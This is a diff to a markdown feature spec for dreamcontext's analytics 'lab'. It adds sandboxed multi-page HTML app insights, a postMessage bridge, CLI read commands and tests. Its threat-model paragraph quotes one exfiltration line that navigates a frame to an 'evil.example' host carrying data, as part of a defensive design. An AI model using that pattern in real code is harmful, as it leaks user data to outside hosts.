@@ -25,6 +25,7 @@ related_tasks:
   - insights-breakdown-contract-matrix-v1-native-reports-layer
   - >-
     the-insights-custom-range-applies-a-window-nobody-can-clear-and-reloads-226kb-to-do-it
+  - script-authored-insights-become-multi-page-interactive-apps-not-fixed-height-cards
 type: feature
 name: lab-analytics-insights
 description: >-
@@ -35,9 +36,11 @@ description: >-
   resolve through a plug-and-play chart registry (eleven renders: number/line/pie/
   raw/funnel/bar/bar_compare/stacked/table/heatmap/breakdown), a universal date-range
   control on every windowed insight, size-aware cards, and an
-  InsightDetailPanel slide-over. NEW (in_review): matrix/v1 breakdown contract for
-  multi-dimensional analytics, html/v1 hybrid (script-authored card bodies with design-
-  token injection), and My Reports (native date-navigable composition layer).
+  InsightDetailPanel slide-over. NEW (in_review): dataset/v1 dimensional row model,
+  app/v1 multi-page interactive apps (script-authored routed bodies with sandboxed
+  bridge, CLI read surface), matrix/v1 breakdown (deprecated for new insights,
+  grandfathered), html/v1 hybrid (single-page card bodies), and My Reports (native
+  date-navigable composition layer).
 pinned: false
 date: '2026-07-05'
 ---
@@ -99,11 +102,25 @@ This is NOT a BI tool. Lab is a **metrics delivery** subsystem: it captures WHAT
 - [x] As a user, html card bodies render with dreamcontext's visual language (colors, spacing, typography) by default via an injected CSS kit (`lab-html-kit.css`), so custom insights feel native without hand-rolling design.
 - [x] As a security-conscious user, html bodies execute in a network-isolated sandbox (no allow-same-origin, CSP default-src 'none') so a script cannot exfiltrate data or phone home.
 
+### App insights (app/v1 — multi-page interactive apps, in_review 2026-08-26)
+
+- [x] As an insight author, I can return `{data, app}` from a script where `data` is a `dataset/v1` bundle (dimensional row model, multiple datasets per insight) and `app` declares an ordered list of sandboxed HTML pages, so my insight becomes a routed, multi-page, interactive, full-screen-capable application — not a fixed-height card.
+- [x] As a script author, each page in `app.pages[]` has its own HTML body and declares which dataset keys it needs by default, so the platform mounts one page at a time and the rest stay unmounted until navigated to.
+- [x] As an app page, I can call `lab.navigate(pageId)` to switch pages, `lab.data(key?)` to read any dataset in my insight's bundle (not only what's currently on screen), and `lab.onRoute(fn)` to react when the host navigates me, and the bridge works both ways over postMessage under the network-less sandbox.
+- [x] As a user, app insights route to `/lab/<slug>` (page 1) and `/lab/<slug>/p/<pageId>` with browser back/forward working, and I can go full-screen via `?fs=1` in the URL or a `LabAppPage` toolbar button.
+- [x] As an agent or script, I can read an app body I didn't author with `dreamcontext lab body <slug> [--page <id>] [--format text|md|html]` (the CLI renders what a page actually shows — as readable text, markdown, or raw HTML) and query its numbers with `dreamcontext lab query <slug> [--where k=v] [--group-by k] [--top N]` (slices the cached dataset bundle, never fetches).
+- [x] As a security-conscious user, the app bridge prevents the frame from navigating itself away via detect-and-cut (load-count teardown + per-instance nonce), not prevention — because no sandbox token stops self-navigation — and the blast radius is honestly bounded: the HTML author IS the script author (same file, same trust domain), so the bridge moves data the author already owns.
+
 ### My Reports (native composition layer, in_review 2026-08-25)
 
 - [x] As a report consumer, I can define a My Report (`lab/reports/<slug>.md`) that composes existing insights into sections, navigate it by date (daily/weekly/monthly), and see every insight's as-of timestamp — honest-nothing when no snapshot exists for that date.
 - [x] As a report consumer, opening a report triggers a scoped sync-job (only the insights that report uses) with progressive section fill, so I'm not waiting for the whole board to sync before seeing my daily report.
 - [x] As a report consumer, I can print a report to PDF or export it as single-file HTML (with inlined CSS and data) or copy the whole thing as Markdown.
+
+### App insights (app/v1 — multi-page interactive apps, in_review 2026-08-26)
+
+- [x] As an insight author, `render: app` + script payload `{data: {primary, datasets}, app: {pages}}` creates a multi-page routed insight where each page is a sandboxed HTML document with a postMessage bridge to the host.
+- [x] As a script author, the `data` is MANDATORY (typed `dataset/v1` — dimensional row model with `dims[]` + `rows[]` + `total`, carrying 1+ named datasets), and `app` declares pages as `{id, label?, html, defaultDataset?}` — the platform handles routing, the script owns presentation.
 
 ## Acceptance Criteria
 
@@ -198,6 +215,16 @@ This is NOT a BI tool. Lab is a **metrics delivery** subsystem: it captures WHAT
 - [x] Full suite 433 files passed, 7717 tests passed, 0 failures. `npm run build` clean. Dashboard + CLI `tsc` clean.
 - [x] Runtime proof: `scripts/verify/lab-breakdown-reports.mjs` (29/29 in real Chromium on scratch vault): pivot render (dims→rows/cols, n chips, low-sample fade, total), raw snapshot with NO Time column, sandboxed html card + typed twin in panel (fetch/img beacons produce 0 network requests, inline script runs), breakdown detail swap/copy, Reports menu → routed page, full-width pivot in section, as-of stamps, pre-history date → honest empty + back to Live restores.
 
+### App insights (render: app, in_review 2026-08-26)
+
+- [x] G1 — **dataset/v1 contract + engine**. Script returns `{data: {primary, datasets: [{key, label?, ...MatrixSet}]}, app?: {pages: [{id, label?, html, defaultDataset?}]}}`. Engine validates, writes `cache.datasets` (the whole bundle), synthesizes legacy `series` from `primary` key for backward compat. Cap: ≤200KB per dataset, ≤10 datasets, ≤400 rows per, dimensional caps from matrix/v1 (≤3 dims, top-8+Other).
+- [x] G2 — **Multi-page routing contract**. App insights route to `/lab/<slug>` (page 1 = `pages[0].id`) and `/lab/<slug>/p/<pageId>`. `LabAppPage` Shell component (replaces card for `render: app`) holds routing, toolbar (title, page nav pills, full-screen toggle), and mounts ONE `LabAppFrame` at a time. Query-string state: `?fs=1` full-screen, `?vault=` survives.
+- [x] G3 — **Sandboxed bridge (security contract)**. Each page's html renders in `LabAppFrame` (`sandbox="allow-scripts"`, no `allow-same-origin`, srcdoc CSP `default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'`) with a bidirectional postMessage bridge. Runtime shim (`lab-app-runtime.js`) injected as PREPENDED script (before author's inline script, so `lab.data()` is defined synchronously) exposes `lab.navigate(pageId)`, `lab.data(key?)`, `lab.onRoute(fn)`. Host gates on `event.source === contentWindow` (identity, NEVER `event.origin` — opaque origin serializes to `"null"`). Per-instance nonce on every message (both directions) + load-count teardown (first `load` = expected srcdoc; second `load` = self-navigation → stop posting, remount to `about:blank` under fresh key).
+- [x] G4 — **CLI read surface**. `dreamcontext lab body <slug> [--page <id>] [--format text|md|html]` reads what an app page renders (text = `textContent` extraction, md = Turndown conversion, html = raw; defaults to text). `dreamcontext lab query <slug> [--dataset <key>] [--where k=v] [--group-by k] [--top N]` slices the cached dataset bundle (never fetches) — WHERE filters rows by exact dim match, GROUP-BY aggregates, TOP caps output.
+- [x] G5 — **Dashboard wiring**. `chartRegistry` entry (`'app'`: routed, no CardBody — the card shows a placeholder "Open" button, detail panel disabled). `LabAppPage.tsx` + `LabAppFrame.tsx` + `LabAppBody.tsx` + `appModel.ts` (protocol + message shapes) + `labAppRuntime.ts` (srcdoc builder + shim source). Theme injection: resolved tokens written into iframe `:root` block, rebuilt on theme flip.
+- [x] G6 — **Skill docs (same change)**. SKILL.md Entity Router gained app-insight litmus tests ("multi-page dashboard", "let the script build its own UI"), cli-reference.md `lab body`/`lab query` verbs, tasks-and-features.md § App insights (the authoring contract this pattern secures — data mandatory, app optional, bridge API, security bound). Marker tests green.
+- [x] G7 — **Validation**. `tests/unit/lab-app.test.ts` (payload validation, caps, cache write, legacy series synth), `lab-app-body.test.ts` (srcdoc builder, shim injection order, CSP), `lab-app-route.test.ts` (routing, page resolution), `lab-app-query.test.ts` (WHERE/GROUP-BY/TOP query algebra). Runtime: `scripts/verify/lab-app-insight.mjs` (app routes, pages nav, `lab.navigate` works, `lab.data` returns numbers, full-screen toggle, `lab body`/`lab query` CLI, self-navigation teardown). Full suite green.
+
 ### Funnel analytics (in_review, 2026-07-21)
 
 - [x] F1 — **Funnel payload contract + cache schema** written and versioned: adapter returns a funnel-set (funnels → meta/metrics/steps/segments + declared dimensions; `funnel-set/v1` shape); engine validates, caps (max 40 funnels, max 64 steps — over-cap keeps first 63 + the final step so Finish always survives, max 8 dimensions with top-8 values→Other, max 64 segment cells, max 400KB), and stores history snapshots per sync for deltas/trends. Legacy `Series[]` payloads under `render: funnel` still render (compact bar fallback) — no breakage of existing insights.
@@ -217,6 +244,20 @@ This is NOT a BI tool. Lab is a **metrics delivery** subsystem: it captures WHAT
 
 ## Constraints & Decisions
 <!-- LIFO: newest at top -->
+
+### App insights (render: app) ship with a sandboxed bridge + dataset/v1, CLI read surface (2026-08-26)
+
+**Owner decision, task `script-authored-insights-become-multi-page-interactive-apps-not-fixed-height-cards`.** An insight's script can now return `{data, app}` where `data` is a `dataset/v1` bundle (≤10 datasets, dimensional row model per matrix/v1 idiom) and `app` declares ≥1 HTML page. The dashboard routes to `/lab/<slug>/p/<pageId>`, mounts ONE sandboxed iframe per page, and bridges it with a postMessage runtime shim (`lab.navigate`, `lab.data`, `lab.onRoute`). An agent or another script reads the body with `dreamcontext lab body <slug> [--page] [--format text|md|html]` (never opens a browser) and queries the numbers with `lab query <slug> [--where] [--group-by] [--top]` (slices the cached bundle, never fetches).
+
+**Security model — detect-and-cut, not prevent.** A sandboxed frame can ALWAYS navigate itself (no CSP or sandbox token stops `location.href = 'https://evil.example/?d=' + data`), and `contentWindow` is a stable `WindowProxy` across navigation (the host doesn't lose its reference). So the mitigation is (1) **load-count teardown** (first `load` = expected srcdoc; second `load` = self-navigation → stop posting to the frame, remount to `about:blank` under a fresh key), and (2) **per-instance nonce** (minted per mount, required on every message both ways — a navigated-away document never learned the new page's nonce so it cannot successfully request data in the window before teardown fires). The honest blast-radius bound: **the HTML author IS the script author** (same file, same trust domain, local execution with credentials). The bridge moves data the author already owns. **Named revisit condition:** this bound holds only while page bodies and data scripts remain co-authored. If bodies ever become shareable/installable independently (a marketplace, an imported page from a different insight/vault), the bound breaks — a body could ask for data its author never had. The fix at that point is a per-page dataset allow-list (checked host-side before answering), not hardening the navigation mitigation further.
+
+**Why script ordering matters — the shim must be synchronously available.** A runtime shim routed through `buildSandboxSrcdoc`'s `bodyScript` (appended after `</body>`) landed AFTER the author's inline `<script>`, so the author's synchronous `const d = lab.data()` threw `ReferenceError: lab is not defined`, silently aborting the remainder of that script block (including later event wiring). The author's script ran too early. Fix: prepend the shim into the `<head>` (before the author's first inline script block), so `lab.*` is defined synchronously. This is a CONTRACT — a future change that moves the shim back to a deferred position breaks every app body.
+
+**Write-path sanitizing is not sanitizing.** A cold deep-link enters through the READ path (`readAppParams` in `labRoute.ts`), so sanitizing only on write (e.g., capping a page array during sync) is insufficient — the route handler had to sanitize too. `readAppParams` now returns `{params, dropped}` so an over-cap URL is distinguishable from a malformed one, and the page self-heals by replacing the URL with the capped version on mount (the user sees the corrected link, not a blank).
+
+**Dataset engine caps single-dim cardinality at top-8 + "Other".** The matrix parser (`parseMatrixSet`) collapses each dimension's values to the top 8 by weight + one synthetic `"Other"` row (aggregated from the tail) — a contract that downstream fixtures and assertions must respect (`MAX_MATRIX_DIM_VALUES = 8`). Anything asserting "9 unique values" or assuming every input row survives will break.
+
+**Related:** `knowledge/patterns/sandboxed-app-bridge-pattern.md` (the reusable security + architecture shape this implementation embodies).
 
 ### matrix/v1 DEPRECATED as an authoring path — dimensional grammar survives as dataset/v1 (2026-08-26)
 
@@ -429,6 +470,22 @@ A tweak is not a preference, it is part of the QUESTION the tile answers: change
 **Tests (tests/unit/):** `lab-matrix` (37), `lab-breakdown-model` (12), `lab-html-body` (13), `lab-reports` (15), `lab-reports-ui` (12), plus extensions to `lab-tweak-resync` and `taxonomy-markers`. Runtime: `scripts/verify/lab-breakdown-reports.mjs` (29/29).
 
 **Size.** 89+ new unit tests across 5 new test files. Backend +5 files, +6 edits. Dashboard +6 files, +4 edits. Full suite 433 files passed, 7717 tests passed, 0 failures.
+
+### App insights (render: app, 2026-08-26 in_review)
+
+**Payload contract (`app/v1` + `dataset/v1`).** Script returns `{data, app?}` where `data` is MANDATORY: `{primary: string, datasets: [{key, label?, ...MatrixSet}]}` — one or more named datasets, each a dimensional row model (dims + rows + total from matrix/v1). `app` is OPTIONAL: `{pages: [{id, label?, html, defaultDataset?}]}` — ≥1 page, html ≤300KB per page, `defaultDataset` names which dataset key `lab.data()` with no argument should return (falls back to `primary` if unset).
+
+**Engine (`src/lib/lab/app.ts`, `dataset.ts`, `datasetQuery.ts`, `htmlText.ts`).** New adapter payload kind `{kind:'app/v1', data, app?}`. Validation + caps: ≤10 datasets, ≤200KB per dataset, ≤400 rows per, dimensional caps from matrix/v1 (≤3 dims, top-8+Other per dim). `parseDatasetBundle` lenient parse, `cache.datasets` written (the whole bundle), legacy `series` synthesized from `primary` key for backward compat (binding, Rule 13). `cache.app` written alongside (pages array with ids/labels/html/defaultDataset); ok run without app clears stale pages. App-less `{data}` payload is valid and renders as a plain breakdown pivot (dataset/v1 subsumes matrix/v1 as the dimensional contract).
+
+**CLI (`src/cli/commands/lab.ts`).** `lab body <slug> [--page <id>] [--format text|md|html]` reads what an app page renders (--format: `text` = `textContent` extraction via JSDOM, `md` = Turndown conversion, `html` = raw; defaults to text; no --page = page 1). `lab query <slug> [--dataset <key>] [--where k=v,...] [--group-by k] [--top N]` slices the cached dataset bundle (never fetches): WHERE filters rows by exact dimension match (comma-separated for AND), GROUP-BY aggregates `v`/`n` by the named dim (other dims dropped), TOP caps output rows. Both commands read `cache.datasets` only — zero network, zero LLM.
+
+**Dashboard (`dashboard/src/components/lab/`):** `chartRegistry` entry (`'app'`: routed, no CardBody — card shows "Open" button, detail panel disabled). `LabAppPage.tsx` Shell (routes `/lab/<slug>` → page 1, `/lab/<slug>/p/<pageId>` → that page; toolbar with title + page nav pills + full-screen toggle `?fs=1`; mounts ONE `LabAppFrame` at a time, unmounted pages stay unmounted). `LabAppFrame.tsx` (sandboxed iframe: `sandbox="allow-scripts"`, no `allow-same-origin`, srcdoc CSP `default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'`; load-count teardown: first `load` = expected, second `load` = self-navigation → `tornRef` set, stop posting, remount to `about:blank` under fresh key; per-instance nonce on every message both ways; identity gate `event.source === contentWindow`, NEVER `event.origin` which is `"null"` under opaque origin). `LabAppBody.tsx` (protocol state machine: initial handshake, route pushes, data responses). `appModel.ts` (message shapes + validation). `labAppRuntime.ts` (`buildSandboxSrcdoc` srcdoc builder: CSP meta FIRST + resolved theme tokens in `:root` block + PREPENDED runtime shim `lab-app-runtime.js` BEFORE author's html so `lab.*` is synchronously available + author's html body; shim source as TS string + `lab-app-runtime.js` byte-identical reference, drift-tested). Runtime shim (`lab-app-runtime.js`) injected into every page exposes `lab.navigate(pageId)`, `lab.data(key?)` (resolves against the whole bundle via optional key or the page's `defaultDataset` or the bundle's `primary`), `lab.onRoute(fn)` (callback fired when host navigates to this page). Theme injection: resolved tokens (CSS vars don't cross iframe boundary) written into `:root`, rebuilt on theme flip.
+
+**Backend files (new):** `src/lib/lab/app.ts` (payload validation, `parseAppPayload`, page caps), `dataset.ts` (bundle validation, `parseDatasetBundle`, caps), `datasetQuery.ts` (WHERE/GROUP-BY/TOP query algebra over cached rows), `htmlText.ts` (JSDOM `textContent` extraction + Turndown markdown conversion for `lab body`). Dashboard: `LabAppPage.tsx`, `LabAppFrame.tsx`, `LabAppBody.tsx`, `appModel.ts`, `labAppRuntime.ts`, `lab-app-runtime.js`. Verify: `scripts/verify/lab-app-insight.mjs`.
+
+**Backend edits:** `src/lib/lab/types.ts` (+DatasetBundle, Dataset, AppManifest, AppPage, AppCacheEntry, RawAppPayload, 'app' in RENDERS), `sync.ts` (app branch: `kind==='app/v1'` → `parseDatasetBundle` + `parseAppPayload` → `cache.datasets` + `cache.app` + legacy series synth), `store.ts` (`toRender` accepts 'app'), `cli/commands/lab.ts` (`lab body` + `lab query` verbs), `chartRegistry.ts` (`'app'` entry).
+
+**Tests (tests/unit/):** `lab-app` (22 — payload validation, caps, cache write, series synth), `lab-app-body` (18 — srcdoc builder, shim prepend order, CSP attrs, theme injection, nonce + teardown), `lab-app-route` (14 — routing, page resolution, URL codec), `lab-app-query` (19 — WHERE exact-match + multi-key AND, GROUP-BY aggregation, TOP cap, missing dataset). Runtime: `scripts/verify/lab-app-insight.mjs` (app routes, page nav pills work, `lab.navigate` switches pages, `lab.data` returns numbers, full-screen toggle, `lab body --page` prints text/md/html, `lab query --where` filters, self-navigation triggers teardown and stops the bridge). Full suite green.
 
 ## Changelog
 <!-- LIFO: newest entry at top -->
